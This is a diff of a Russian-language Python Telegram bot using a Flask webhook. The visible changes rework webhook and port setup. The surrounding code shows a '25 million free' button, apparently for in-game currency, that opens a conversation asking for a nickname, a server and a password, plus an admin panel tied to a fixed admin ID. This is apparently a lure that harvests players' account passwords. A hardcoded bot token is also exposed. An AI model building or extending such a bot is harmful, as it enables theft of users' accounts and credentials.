@@ -1,19 +1,15 @@
 import logging
+import os
 from flask import Flask, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
-# ========== КОНФИГ ==========
 BOT_TOKEN = "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM"
 ADMIN_ID = 6005507174
 
-# Состояния для ConversationHandler
 NICKNAME, SERVER, PASSWORD = range(3)
-
-# Временное хранилище данных пользователей
 user_data = {}
 
-# ========== КЛАВИАТУРЫ ==========
 def get_main_menu():
     keyboard = [
         [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
@@ -21,7 +17,6 @@ def get_main_menu():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ========== ОБРАБОТЧИКИ ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "👋 *Добро пожаловать!*\n\n"
@@ -106,13 +101,11 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")
 
-# ========== НАСТРОЙКА БОТА ==========
+# ========== НАСТРОЙКА ==========
 app = Flask(__name__)
 
-# Создаём приложение бота
 bot_app = Application.builder().token(BOT_TOKEN).build()
 
-# Регистрируем обработчики
 conv_handler = ConversationHandler(
     entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
     states={
@@ -129,7 +122,9 @@ bot_app.add_handler(CommandHandler("id", get_id))
 bot_app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
 bot_app.add_handler(conv_handler)
 
-# Вебхук для Render
+# Принудительная установка вебхука при старте
+WEBHOOK_URL = None
+
 @app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
 def webhook():
     update = Update.de_json(request.get_json(), bot_app.bot)
@@ -140,16 +135,18 @@ def webhook():
 def index():
     return "Bot is running!", 200
 
-# ========== ЗАПУСК ==========
 if __name__ == "__main__":
-    # Устанавливаем вебхук
-    import os
-    webhook_url = os.getenv("RENDER_EXTERNAL_URL")
-    if webhook_url:
-        bot_app.bot.set_webhook(f"{webhook_url}/webhook/{BOT_TOKEN}")
-        print(f"Webhook set to {webhook_url}/webhook/{BOT_TOKEN}")
+    import sys
+    port = int(os.getenv("PORT", 8080))
+    render_url = os.getenv("RENDER_EXTERNAL_URL")
+    
+    if render_url:
+        webhook_url = f"{render_url}/webhook/{BOT_TOKEN}"
+        print(f"Setting webhook to: {webhook_url}")
+        bot_app.bot.set_webhook(webhook_url)
+        print("Webhook set successfully!")
     else:
         print("No RENDER_EXTERNAL_URL, running with polling...")
-        bot_app.run_polling()
     
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
+    print(f"Starting Flask server on port {port}")
+    app.run(host="0.0.0.0", port=port)
